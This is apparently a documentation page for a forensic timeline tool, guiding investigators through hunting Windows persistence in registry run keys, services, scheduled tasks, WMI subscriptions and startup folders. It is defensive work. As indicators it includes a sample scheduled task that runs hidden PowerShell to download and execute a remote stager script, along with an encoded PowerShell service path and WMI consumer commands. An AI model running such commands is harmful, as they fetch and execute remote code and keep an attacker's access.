# Persistence Hunting

Persistence is one of the most critical phases of an intrusion to identify. Adversaries establish persistence to maintain access across reboots, credential changes, and partial remediation. This guide walks through a systematic approach to hunting for persistence mechanisms using IRFlow Timeline, covering registry run keys, scheduled tasks, services, WMI subscriptions, and DLL hijacking.

::: info Features Used
- [Search (Regex)](/features/search-filtering) -- pattern matching across parsed artifacts
- [Process Tree](/features/process-tree) -- trace parent-child relationships for persistence installers
- [Color Rules](/features/color-rules) -- highlight known persistence paths automatically
- [Virtual Grid](/features/virtual-grid) -- sort and filter large artifact sets
- [Cross-Tab Search](/workflows/multi-tab) -- correlate registry changes with process execution
- [IOC Matching](/features/ioc-matching) -- sweep for known-bad indicators in persistence locations
:::

## Preparation

### 1. Load RECmd Profile Output

Registry hives are a primary source of persistence artifacts. Before diving in, load the parsed registry output produced by Eric Zimmerman's RECmd using the KAPE module or standalone execution.

| Artifact Source | Description |
|---|---|
| `NTUSER.DAT` | Per-user Run/RunOnce keys, shell folders, startup items |
| `SOFTWARE` | Machine-wide Run/RunOnce, services, AppInit_DLLs, Winlogon |
| `SYSTEM` | Services, drivers, Session Manager settings |
| `AmCache.hve` | Evidence of executable installation and first run |

Load the RECmd CSV output into a dedicated tab. See [KAPE Integration](/workflows/kape-integration) for automating this step.

### 2. Set Up Color Rules for Persistence Paths

Before beginning your hunt, configure [Color Rules](/features/color-rules) to flag common persistence registry locations automatically. This ensures that relevant entries stand out as you scroll through thousands of registry key-value pairs.

Recommended color rule patterns:

| Pattern | Target | Suggested Color |
|---|---|---|
| `CurrentVersion\\Run` | Run and RunOnce keys | Red background |
| `CurrentVersion\\Explorer\\Shell Folders` | Startup folder redirects | Orange background |
| `\\Services\\` | Service creation and modification | Yellow background |
| `Winlogon\\` | Winlogon helper DLLs and shell replacement | Red background |
| `AppInit_DLLs` | DLL injection via AppInit | Red background |
| `schtasks` | Scheduled task command-line creation | Orange background |
| `WMI` | WMI event subscriptions | Orange background |

::: tip
Save your persistence color rule set as a reusable profile. You can export it from the Color Rules panel and reload it for future investigations, ensuring consistent visual triage across cases.
:::

## Registry Run Keys

### 3. Search for Run and RunOnce Entries

Use [Search (Regex)](/features/search-filtering) to locate all Run and RunOnce registry entries across loaded hives:

```
CurrentVersion\\(Run|RunOnce)
```

Review matches carefully. Legitimate entries typically reference well-known paths under `C:\Program Files\` or `C:\Windows\System32\`. Focus on entries pointing to:

- Temp directories: `C:\Users\<user>\AppData\Local\Temp\`
- Public profile paths: `C:\Users\Public\`
- Uncommon extensions: `.hta`, `.vbs`, `.js`, `.ps1`
- Obfuscated names: `svchost32.exe`, `csrss64.exe`, `winupdate.exe`

Example of a suspicious Run key value:

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    "WindowsSecurityUpdate" = "C:\Users\Public\Downloads\svcmgr.exe -k netsvcs"
```

### 4. Check for Service-Based Persistence

Services are a favored persistence mechanism because they run with SYSTEM privileges and start automatically. Search for recently created or modified services:

```
ControlSet.*\\Services\\.*ImagePath
```

Suspicious indicators in service entries include:

| Indicator | Example |
|---|---|
| Binary in user-writable path | `C:\ProgramData\updater\beacon.exe` |
| Misspelled legitimate name | `Spooler1`, `WinDefenderUpdate` |
| PowerShell in ImagePath | `powershell.exe -enc JABjAGwA...` |
| `cmd.exe /c` wrapper | `cmd.exe /c C:\Temp\payload.bat` |
| `svchost.exe -k` with unknown group | Custom ServiceDll in Parameters subkey |

### 5. Trace Service Creation with Process Tree

When you identify a suspicious service, use the [Process Tree](/features/process-tree) to determine what process created it. Switch to a tab containing process execution data (Sysmon, Windows Security, or MFT timeline) and search for the service name.

Look for `services.exe` spawning unknown child processes, or `sc.exe` and `reg.exe` being invoked by unexpected parents such as `cmd.exe` launched from `winword.exe` or `outlook.exe`.

## Scheduled Tasks

### 6. Search Event Logs for Task Creation

Scheduled task creation is logged by several sources. Load Windows Security and Task Scheduler operational logs and filter for the following Event IDs:

| Event ID | Log Source | Description |
|---|---|---|
| 4698 | Security | A scheduled task was created |
| 4702 | Security | A scheduled task was updated |
| 106 | Task Scheduler Operational | Task registered |
| 200 | Task Scheduler Operational | Task execution started |
| 201 | Task Scheduler Operational | Task execution completed |

### 7. Identify Suspicious Task Definitions

Use regex search to locate task creation activity:

```
(schtasks\.exe|4698|TaskScheduler.*106)
```

Once you find task creation events, examine the XML task definition embedded in Event ID 4698. Pay attention to:

- **Actions**: Commands referencing `powershell.exe`, `mshta.exe`, `rundll32.exe`, `cmd.exe`, or binaries in non-standard paths
- **Triggers**: Tasks configured with logon triggers, idle triggers, or short repetition intervals (e.g., every 5 minutes)
- **Principal**: Tasks running as `SYSTEM` or with highest available privileges
- **Hidden flag**: Tasks with `<Hidden>true</Hidden>` in the XML definition

Example suspicious scheduled task:

```
Task Name:   \Microsoft\Windows\Maintenance\SystemCleanup
Action:      powershell.exe -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.47/stager.ps1')"
Trigger:     At system startup, repeat every 15 minutes
Run As:      SYSTEM
```

::: tip
Adversaries frequently name tasks to blend in with legitimate Windows maintenance tasks. Compare task names against a known-good baseline or search for tasks created during the intrusion timeframe using the [Histogram](/features/histogram) view to spot temporal clusters.
:::

## WMI Event Subscriptions

### 8. Hunt for WMI Persistence

WMI event subscriptions are a stealthy persistence mechanism composed of three components: an Event Filter, an Event Consumer, and a Filter-to-Consumer Binding. Detection relies on:

| Event ID | Log Source | Description |
|---|---|---|
| 5861 | WMI-Activity Operational | WMI event subscription created |
| 5859 | WMI-Activity Operational | WMI query error (noisy but useful) |
| Sysmon 19 | Sysmon | WmiEventFilter activity |
| Sysmon 20 | Sysmon | WmiEventConsumer activity |
| Sysmon 21 | Sysmon | WmiEventConsumerToFilter activity |

Search for WMI subscription creation:

```
(5861|WmiEvent|ActiveScriptEventConsumer|CommandLineEventConsumer)
```

A real-world example of malicious WMI persistence:

```
Filter:     SELECT * FROM __InstanceModificationEvent WITHIN 60
            WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
            AND TargetInstance.SystemUpTime >= 240
Consumer:   CommandLineEventConsumer
            CommandLineTemplate: "cmd.exe /c C:\ProgramData\Microsoft\Crypto\RSA\beacon.exe"
Binding:    Links the filter to the consumer
```

### 9. Correlate WMI with Process Execution

Use [Cross-Tab Search](/workflows/multi-tab) to pivot from a WMI subscription event in the event log tab to the corresponding process execution in a Sysmon or process tracking tab. Search for the binary referenced in the consumer's command line template across all open tabs.

In the Process Tree, look for `WmiPrvSE.exe` spawning unexpected child processes -- this is the telltale sign of a WMI consumer executing its payload.

## DLL Search Order Hijacking and Startup Folder

### 10. Check for DLL Hijacking

DLL search order hijacking involves placing a malicious DLL in a directory searched before the legitimate DLL location. Search for:

```
(\.dll).*(AppData|ProgramData|Users\\Public|Temp)
```

Cross-reference any DLL load events (Sysmon Event ID 7) in non-standard directories with the [Process Tree](/features/process-tree) to see which process loaded the DLL and what it subsequently executed.

### 11. Review Startup Folder Items

Search for references to the Startup folder path:

```
(Start Menu\\Programs\\Startup|shell:startup)
```

Also review the Shell Folders registry key for redirected startup paths:

```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    "Startup" = "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

If the Startup path has been redirected to a non-standard location, this is a strong indicator of tampering.

## Consolidation

### 12. Build a Persistence Summary

After completing the hunt, use [Bookmarks and Tags](/features/bookmarks-tags) to tag every confirmed persistence mechanism with a `persistence` tag. Use [Stacking](/features/stacking) on the tagged entries to group by mechanism type (registry, scheduled task, service, WMI).

Build a consolidated view by exporting tagged items via [Export Reports](/workflows/export-reports). A final persistence summary should include:

| Field | Description |
|---|---|
| Mechanism Type | Registry Run Key, Service, Scheduled Task, WMI, Startup Folder |
| Path / Key | Full registry path or task name |
| Payload | Binary path or command line |
| Persistence Scope | User-level or machine-level |
| Install Timestamp | When the persistence was established |
| Installing Process | Parent process that created the mechanism |

::: tip
Use the persistence install timestamps as pivot points. Search the surrounding five-minute window for lateral movement, credential access, or data staging activity to build a complete attack narrative.
:::

## Next Steps

- [Malware Execution Analysis](/dfir-tips/malware-execution-analysis) -- trace what the persisted payload actually did when it ran
- [Lateral Movement Tracing](/dfir-tips/lateral-movement-tracing) -- determine how the attacker reached the host where persistence was installed
- [Threat Intel IOC Sweeps](/dfir-tips/threat-intel-ioc-sweeps) -- match persistence artifacts against known threat intelligence
- [Ransomware Investigation](/dfir-tips/ransomware-investigation) -- follow the full attack chain when persistence leads to encryption
- [Building a Final Report](/dfir-tips/building-final-report) -- compile persistence findings into a deliverable report
